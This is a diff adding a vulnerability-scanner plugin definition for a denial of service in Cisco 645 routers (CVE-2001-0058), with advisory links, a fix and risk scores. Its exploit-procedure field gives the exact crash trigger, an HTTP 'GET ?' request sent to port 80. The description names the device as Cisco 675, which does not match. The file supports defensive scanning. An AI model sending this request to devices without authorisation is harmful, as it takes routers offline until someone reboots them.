@@ -1,0 +1,48 @@
+<plugin_id>25</plugin_id>
+<plugin_name>Cisco 645 http get Denial of Service</plugin_name>
+<plugin_family>Network devices</plugin_family>
+<plugin_created_date>2003/11/14</plugin_created_date>
+<plugin_created_name>Marc Ruef</plugin_created_name>
+<plugin_created_email>marc dot ruef at computec dot ch</plugin_created_email>
+<plugin_created_web>http://www.computec.ch</plugin_created_web>
+<plugin_created_company>computec.ch</plugin_created_company>
+<plugin_updated_name>Marc Ruef</plugin_updated_name>
+<plugin_updated_email>marc dot ruef at computec dot ch</plugin_updated_email>
+<plugin_updated_web>http://www.computec.ch</plugin_updated_web>
+<plugin_updated_company>computec.ch</plugin_updated_company>
+<plugin_updated_date>2004/11/13</plugin_updated_date>
+<plugin_version>1.5</plugin_version>
+<plugin_changelog>Corrected the plugin structure and added the accuracy values in 1.5</plugin_changelog>
+<plugin_protocol>tcp</plugin_protocol>
+<plugin_port>80</plugin_port>
+<plugin_procedure_exploit>open|send GET ?\n\n|sleep 5|close|icmp_alive</plugin_procedure_exploit>
+<plugin_exploit_accuracy>50</plugin_exploit_accuracy>
+<plugin_comment>Using this plugin can cause a denial of service of affected systems. Use this plugin with cause.</plugin_comment>
+<bug_advisory>http://online.securityfocus.com/archive/1/147562</bug_advisory>
+<bug_produced_name>Cisco Systems</bug_produced_name>
+<bug_produced_email>info at cisco dot com</bug_produced_email>
+<bug_produced_web>http://www.cisco.com</bug_produced_web>
+<bug_affected>Cisco 645</bug_affected>
+<bug_not_affected>Other Cisco and network devices</bug_not_affected>
+<bug_vulnerability_class>Denial Of Service</bug_vulnerability_class>
+<bug_description>The Cisco 675 is vulnerable to a remote Denial of Service attack. An attacker may crash the device by sending the HTTP request "GET ?" to the HTTP port tcp/80 of the router. You need to reboot the device to make it work again.</bug_description>
+<bug_solution>Upgrade your Cisco firmware and filter incoming traffic on port tcp/80. As workaround (disabling the web service) you could add the rule "set web disabled", "write" and "reboot" into your device.</bug_solution>
+<bug_fixing_time>20 minutes</bug_fixing_time>
+<bug_exploit_availability>Yes</bug_exploit_availability>
+<bug_exploit_url>http://www.nessus.org</bug_exploit_url>
+<bug_remote>Yes</bug_remote>
+<bug_local>No</bug_local>
+<bug_severity>High</bug_severity>
+<bug_popularity>7</bug_popularity>
+<bug_simplicity>8</bug_simplicity>
+<bug_impact>8</bug_impact>
+<bug_risk>7</bug_risk>
+<bug_nessus_risk>High</bug_nessus_risk>
+<bug_check_tool>Nessus is also able to do the same check.</bug_check_tool>
+<source_cve>CVE-2001-0058</source_cve>
+<source_osvdb_id>460</source_osvdb_id>
+<source_nessus_id>10561</source_nessus_id>
+<source_issxforce_id>5626</source_issxforce_id>
+<source_literature>Hacking Exposed: Network Security Secrets & Solutions, Stuart McClure, Joel Scambray and George Kurtz, February 25, 2003, 4th Edition, McGraw-Hill Osborne Media, ISBN 0072227427</source_literature>
+<source_misc>http://www.cisco.com/warp/public/707/CBOS-multiple.shtml</source_misc>
+
